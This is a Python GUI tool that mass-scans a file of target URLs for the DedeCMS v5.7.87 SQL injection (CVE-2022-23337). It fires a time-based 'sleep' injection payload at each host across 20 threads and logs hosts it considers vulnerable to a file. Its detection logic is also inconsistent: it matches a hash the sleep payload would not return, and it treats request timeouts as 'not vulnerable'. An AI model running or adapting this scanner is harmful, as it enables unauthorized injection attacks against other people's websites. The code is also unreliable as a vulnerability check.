import requests
import tkinter as tk
from tkinter import scrolledtext
from concurrent.futures import ThreadPoolExecutor
from ttkbootstrap.constants import *
def dede_sql_exp(url):
    poc = r"""/dede/article_coonepage_rule.php?action=del&ids=2,1)%20or%20sleep(3)%23"""
    url = url + poc
    try:
        res = requests.get(url, timeout=3)
        if "c4ca4238a0b923820dcc509a6f75849b" in res.text:
            dedesql_text.insert(END,"【！！！！！！】存在漏洞的url：" + url + "\n")
            dedesql_text.see(END)
            with open ("存在DedeCMSv5.7.87SQL注入漏洞的url.txt", 'a') as f:
                f.write(url + "\n")
    except:
        dedesql_text.insert(END, "【×】不存在漏洞的url：" + url + "\n")
        dedesql_text.see(END)
def get_dede_addr():
    with open("修正后的url.txt","r") as f:
        for address in f.readlines():
            address = address.strip()
            yield address
def dedesql_gui():
    dedesql = tk.Tk()
    dedesql.geometry("910x450")
    dedesql.title("DedeCMS v5.7.87 SQL注入漏洞(CVE-2022-23337)一把梭")
    dedesql.resizable(0, 0)
    dedesql.iconbitmap('logo.ico')
    global dedesql_text
    dedesql_text = scrolledtext.ScrolledText(dedesql,width=123, height=25)
    dedesql_text.grid(row=0, column=0, padx=10, pady=10)
    dedesql_text.see(END)
    addrs = get_dede_addr()
    max_thread_num = 20
    executor = ThreadPoolExecutor(max_workers=max_thread_num)
    for addr in addrs:
        future = executor.submit(dede_sql_exp, addr)
    dedesql.mainloop()